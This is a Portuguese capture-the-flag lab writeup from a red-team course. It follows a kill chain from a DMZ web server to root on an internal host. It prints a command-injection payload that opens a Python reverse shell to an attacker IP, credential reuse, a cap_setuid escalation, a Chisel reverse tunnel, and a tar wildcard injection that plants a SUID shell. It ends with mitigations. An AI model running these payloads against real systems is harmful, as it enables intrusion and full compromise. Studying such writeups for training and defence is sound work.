---
title: "CTF Tribo Tecnologia: Do Perímetro DMZ ao Root Interno"
date: 2026-09-27 10:00:00 -0300
categories: [Writeups, FIAP]
tags: [linux, command-injection, rce, credential-reuse, privilege-escalation, linux-capabilities, setuid, pivoting, chisel, lateral-movement, tar-wildcard-injection, systemd]
---

Neste writeup, documento a resolução de mais um laboratório da pós-graduação de Offensive Cyber Security - Red Team Ops da FIAP. Este desafio simula um engajamento completo de red team: comprometer um servidor de perímetro exposto, escalar privilégios nele, descobrir uma rede interna não documentada, pivotar até um host interno e escalar privilégios novamente até capturar a flag final.

## 1. Contextualização e Escopo

O cenário proposto foi o seguinte:

> Você foi contratado como red teamer para avaliar a Tribo Tecnologia. O único ativo alcançável é o servidor de perímetro (DMZ) em `192.168.56.10` — mas suspeita-se que, a partir dele, seja possível chegar a um sistema interno que não deveria estar exposto. Comprometa o perímetro, obtenha root, descubra e alcance o host interno por movimentação lateral e escale privilégios também nele. Obtenha root no sistema interno e encontre a flag final. Mantenha-se no escopo, sem ataques destrutivos, e documente sua kill chain.

O único ativo alcançável no início do engajamento era o servidor de perímetro `192.168.56.10`. Todo o resto, incluindo a existência e a localização da rede interna, precisou ser descoberto a partir dele.

## 2. Reconhecimento do Perímetro

Iniciei com uma varredura do servidor de perímetro, identificando as portas 22, 80 e 8080 abertas.

![Varredura de portas do servidor de perímetro](/assets/img/posts/linux-pos-exploracao-ctf-tribo-tecnologia/nmap.png)
_Varredura de portas do servidor de perímetro_

Como segundo passo, realizei uma varredura de diretórios na porta 8080:

```bash
feroxbuster -u http://192.168.56.10:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt
```

A varredura localizou o diretório `/tools/`.

![Varredura de diretórios com feroxbuster](/assets/img/posts/linux-pos-exploracao-ctf-tribo-tecnologia/feroxbuster.png)
_Varredura de diretórios com feroxbuster_

## 3. Acesso Inicial: Command Injection em ping.php

Dentro do diretório `/tools/`, encontrei um arquivo `ping.php` que aceitava um endereço IP como entrada e refletia, na resposta, a execução do comando `ping` diretamente no servidor — um cenário clássico de **OS Command Injection**.

![Interface do ping.php](/assets/img/posts/linux-pos-exploracao-ctf-tribo-tecnologia/ping-php.png)
_Interface do ping.php vulnerável a injeção de comando_

Encadeei um segundo comando após o IP esperado, usando `&`, para obter uma shell reversa em Python:

```bash
192.168.56.10 & python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.50",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

A injeção funcionou, estabelecendo uma conexão reversa com a minha máquina atacante e abrindo uma shell interativa no servidor.

![Shell reverso obtido via command injection](/assets/img/posts/linux-pos-exploracao-ctf-tribo-tecnologia/shell-reverso.png)
_Shell reverso obtido via command injection no ping.php_

## 4. Coleta de Credenciais no Perímetro

Com acesso à shell, busquei por arquivos graváveis e credenciais expostas:

```bash
find / -writable -type f 2>/dev/null | grep -v -E "/proc|/sys|/var/www/html"
```

```
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/www/vulnapp/tools/ping.php
/var/www/vulnapp/index.php
/var/www/vulnapp/config.php
/var/www/flag_foothold.txt
```

O arquivo `config.php` continha uma credencial em texto plano:

```bash
cat /var/www/vulnapp/config.php
```

```php
<?php
$db_host = '127.0.0.1';
$db_name = 'corpapp';
$db_user = 'webapp';
$db_pass = 'Trib0Web!2024';
?>
```

Em seguida, verifiquei os usuários do sistema em `/etc/passwd`, identificando as contas `fiap` e `jdias`:

```bash
cat /etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
fiap:x:1000:1000:fiap:/home/fiap:/bin/bash
jdias:x:1001:1001::/home/jdias:/bin/bash
```

Testei a credencial encontrada contra os usuários do sistema via SSH e consegui autenticar como `jdias`, um caso de **reuso de credenciais** entre a aplicação web e uma conta de sistema.

## 5. Escalada de Privilégios no Servidor de Perímetro (web01)

Já autenticado como `jdias`, busquei por binários com capabilities Linux atribuídas:

![Binários com capabilities atribuídas](/assets/img/posts/linux-pos-exploracao-ctf-tribo-tecnologia/getcap.png)
_Binários com capabilities atribuídas, destacando o pycheck_

O binário `/opt/maintenance/pycheck` chamou atenção por possuir `cap_setuid=ep`, a capability que permite a um processo alterar seu próprio UID, mesmo sem ser root. Ao executá-lo, descobri que se tratava de um interpretador Python interativo, o que permitiu escalar diretamente para root:

```bash
/opt/maintenance/pycheck
```

```python
>>> import os
>>> os.setuid(0)
>>> os.system('/bin/bash')
```

![Root obtido no servidor de perímetro via pycheck](/assets/img/posts/linux-pos-exploracao-ctf-tribo-tecnologia/root-web01.png)
_Root obtido no servidor de perímetro via abuso da capability do pycheck_

## 6. Descoberta e Pivô para a Rede Interna

Com root no servidor de perímetro, consultei as interfaces de rede e identifiquei uma segunda rede, `192.168.57.0/24`, não documentada no escopo original.

![Interfaces de rede do servidor de perímetro](/assets/img/posts/linux-pos-exploracao-ctf-tribo-tecnologia/interfaces-rede-web01.png)
_Interface de rede adicional descoberta no servidor de perímetro_

Direto da máquina comprometida, mapeei a rede interna com um laço de `ping`, encontrando um host ativo em `192.168.57.20`:

```bash
for i in {1..254}; do (ping -c 1 -W 1 192.168.57.$i | grep "64 bytes" &); done
```

```
64 bytes from 192.168.57.10: icmp_seq=1 ttl=64 time=0.032 ms
64 bytes from 192.168.57.20: icmp_seq=1 ttl=64 time=0.382 ms
```

Em seguida, varri as portas desse host com `nc`, encontrando as portas 22 e 80 abertas:

```bash
for p in {1..65535}; do (nc -zvw1 192.168.57.20 $p 2>&1 | grep -E "open|succeeded"); done
```

```
Connection to 192.168.57.20 22 port [tcp/ssh] succeeded!
Connection to 192.168.57.20 80 port [tcp/http] succeeded!
```

Como o host interno não era diretamente alcançável da minha máquina atacante, usei o **Chisel** para criar um túnel reverso através do servidor de perímetro já comprometido. Na máquina atacante, subi o servidor Chisel:

```bash
./chisel server -p 8000 --reverse
```

E, a partir do servidor de perímetro (já com root), conectei como cliente, redirecionando a porta 80 do host interno para a porta local 8080 e a porta 22 para a porta local 2222 na minha máquina atacante:

```bash
/tmp/chisel client 192.168.56.50:8000 R:8080:192.168.57.20:80 R:2222:192.168.57.20:22
```

## 7. Acesso ao Host Interno e Escalada Final (app02)

Com o túnel estabelecido, testei a credencial de `jdias` (já válida no perímetro) contra o host interno via SSH, através da porta redirecionada:

```bash
ssh jdias@127.0.0.1 -p 2222
```

O login funcionou, confirmando reuso da mesma credencial também no ambiente interno.

Já dentro do host interno (`app02`), busquei por rotinas agendadas e encontrei um timer do systemd executando uma rotina de backup a cada 2 minutos como root:

```bash
cat /etc/systemd/system/backup.timer
cat /etc/systemd/system/backup.service
```

```ini
[Unit]
Description=Agendamento da rotina de backup dos relatorios

[Timer]
OnBootSec=90s
OnUnitActiveSec=2min
AccuracySec=15s
Unit=backup.service

[Install]
WantedBy=timers.target
```

```ini
[Unit]
Description=Rotina de backup dos relatorios

[Service]
Type=oneshot
User=root
ExecStart=/usr/local/sbin/run_backup.sh
```

O script executado pelo serviço continha uma chamada ao `tar` vulnerável a **injeção via wildcard**:

```bash
cat /usr/local/sbin/run_backup.sh
```

```bash
#!/bin/bash
cd /home/jdias/reports || exit 1
/usr/bin/tar czf /opt/backups/reports-latest.tgz *
```

Como o `tar` era executado com `*` dentro de um diretório sob meu controle (`/home/jdias/reports`), criei arquivos com nomes que o `tar` interpreta como opções de linha de comando em vez de nomes de arquivo — a técnica clássica de **tar wildcard injection**:

```bash
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh payload.sh"
```

![Arquivos de injeção via wildcard criados no diretório de backup](/assets/img/posts/linux-pos-exploracao-ctf-tribo-tecnologia/wildcard-parametros.png)
_Arquivos `--checkpoint` e `--checkpoint-action` criados para forçar a execução do payload_

```bash
cat payload.sh
```

```bash
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

Na próxima execução agendada do serviço de backup (rodando como root), o `tar` interpretou os nomes de arquivo como opções, executando `payload.sh` e criando `/tmp/rootbash` com **SUID** de root.

![rootbash criado com SUID via injeção no backup automático](/assets/img/posts/linux-pos-exploracao-ctf-tribo-tecnologia/rootbash-criado.png)
_/tmp/rootbash criado com SUID de root_

Com o binário SUID disponível, obtive uma shell root persistente e capturei a flag final:

```bash
/tmp/rootbash -p
```

```
whoami
root
```

## 8. Visão Executiva e Análise de Riscos

Esse engajamento é um bom exemplo de como uma cadeia de falhas individualmente moderadas se combina em um comprometimento total da infraestrutura. Nenhuma das vulnerabilidades exploradas, isoladamente, seria classificada como crítica, mas a soma delas permitiu o caminho completo do perímetro público até root em um sistema interno que nunca deveria ter sido alcançável.

A cadeia teve início em uma falha clássica de validação de entrada (injeção de comando em uma ferramenta de diagnóstico exposta publicamente), foi agravada por reuso de credenciais entre a aplicação web e contas de sistema, e essa mesma credencial reutilizada entre o perímetro e a rede interna, por uma capability Linux atribuída de forma excessivamente permissiva a um binário de manutenção, pela ausência de segmentação de rede efetiva entre a DMZ e a rede interna, e, por fim, por um script de automação rodando como root que processava arquivos de um diretório controlado por um usuário de baixo privilégio.

As recomendações de mitigação acompanham cada elo dessa cadeia: validar e restringir rigorosamente entradas de usuário em qualquer ferramenta exposta (ou remover ferramentas de diagnóstico do ambiente de produção), eliminar o reuso de credenciais entre aplicações e contas de sistema, aplicando princípio de menor privilégio na atribuição de capabilities, reforçar a segmentação de rede entre a DMZ e segmentos internos, e evitar o uso de wildcards não sanitizados em comandos executados com privilégios elevados, preferindo caminhos explícitos ou a flag `--` para encerrar o parsing de opções.
